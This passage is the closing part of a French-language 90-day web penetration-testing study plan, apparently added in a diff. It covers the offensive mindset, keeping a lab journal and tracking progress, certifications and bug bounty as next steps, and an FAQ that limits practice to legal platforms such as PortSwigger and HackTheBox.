+Développeur: "Comment faire en sorte que ça marche?"
+Pentester: "Comment faire en sorte que ça se casse?"
+
+Tu dois penser OFFENSIF. Challenge chaque assumption.
+"Est-ce que je peux vraiment pas accéder aux données d'autres users?"
+→ Essaie! /user/123 → /user/456
+```
+
+### 3. Documenter ton apprentissage
+```
+Pour chaque vulnérabilité:
+1. Écris la définition dans tes mots
+2. Décris comment l'exploiter
+3. Écris le code vulnérable
+4. Écris le code sécurisé
+5. Enregistre les payloads que tu as utilisés
+
+Cela devient ton "pentest playbook" personnel!
+```
+
+### 4. S'entraîner régulièrement
+```
+Semaine 1: 10h → 3h/jour (pas viable)
+Semaine 1: 10h → 1-2h/jour (soutenable)
+
+Mieux: Cohérence que intensité
+1h chaque jour > 7h une seule fois par semaine
+```
+
+---
+
+## 📊 SUIVI DE PROGRESSION
+
+**Tracker dans un spreadsheet ou notion:**
+
+```
+Date     | Concept           | Lab                    | Status    | Notes
+---------|-------------------|------------------------|-----------|----------
+Jan 8    | HTTP Basics       | N/A                    | ✓ Done    | TLS clear
+Jan 10   | Burp Suite Setup  | Configuration          | ✓ Done    | Proxy OK
+Jan 14   | SQLi Basics       | PortSwigger #1         | ✓ Done    | Error-based
+Jan 18   | SQLi Union        | PortSwigger #2         | ⏳ In Prog | Struggling
+```
+
+---
+
+## 🏁 APRÈS LES 90 JOURS
+
+### Où tu seras:
+- ✅ Capable de tester une app web seul
+- ✅ Trouver 80%+ des vulnérabilités courantes
+- ✅ Écrire des rapports professionnels
+- ✅ Automatiser des tests avec Burp Suite
+- ✅ Comprendre la plupart des OWASP Top 10
+
+### Prochaines étapes (optionnel):
+```
+1. Certifications
+   - eWPT (Web Penetration Tester)
+   - OSCP (Offensive Security Certified Professional)
+   
+2. HackTheBox Pro
+   - Plus de machines réalistes
+   - Simulations d'environment réel
+   
+3. Bug bounty
+   - HackerOne, Bugcrowd
+   - Gagner en testant des apps réelles
+   
+4. Pentest professionnel
+   - Rejoindre une agence
+   - Services: Acunetix, Synack, Intigriti
+```
+
+---
+
+## ❓ QUESTIONS FRÉQUENTES
+
+**Q: Je suis bloqué sur un lab. Que faire?**
+A: 
+1. Relis la théorie (5 min)
+2. Essaie une approche différente (10 min)
+3. Dessine la requête SQL sur papier (5 min)
+4. Cherche l'indice PortSwigger (2 min)
+5. Regarde la solution (dernier recours)
+
+**Q: Burp Suite Community vs Professional?**
+A: Community est suffisant pour les 90 jours. Professional ($399/an) ajoute Scanner automatique, mais tu n'en as pas besoin pour apprendre.
+
+**Q: Je dois mémoriser les payloads?**
+A: Non! C'est important de COMPRENDRE. Les payloads, tu peux toujours les googler.
+
+**Q: Est-ce que c'est légal?**
+A: La formation est légale. Tester des apps SANS permission est illégal. Utilise UNIQUEMENT PortSwigger, HackTheBox, TryHackMe, DVWA. Jamais des sites réels!
+
+---
+
+## 📞 PROCHAINES ÉTAPES
+
+1. **Remplis le formulaire d'évaluation** au début de ce plan
+2. **Commence la Semaine 1** dès demain
+3. **Partage ton premier blocage** → Je te guide avec indices
+4. **Documente chaque lab** → Build ton expertise
+
+**Tu es prêt? On commence! 🚀**
+
+---
+
+*Plan créé par ton mentor senior pentester.
+Bonne chance!* 🎯
